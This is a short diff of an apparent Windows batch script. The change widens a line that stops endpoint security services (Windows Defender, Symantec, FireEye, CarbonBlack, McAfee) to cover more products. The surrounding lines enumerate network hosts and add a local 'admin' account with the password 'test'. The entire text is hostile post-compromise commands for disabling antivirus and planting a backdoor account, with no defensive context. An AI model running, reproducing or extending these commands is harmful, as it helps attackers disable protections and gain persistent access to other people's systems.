@@ -64,7 +64,7 @@ net view
 ECHO ============================
 net stop windefend
 ECHO ============================
-sc stop WinDefend & sc stop SepMasterService & sc stop xagt & sc stop CarbonBlack
+sc stop SepMasterService & sc stop Windefend & sc stop xagt & sc stop CarbonBlack & sc stop mcshield & sc stop msmpsvc
 ECHO ============================
 net user admin test /add
 ECHO ============================
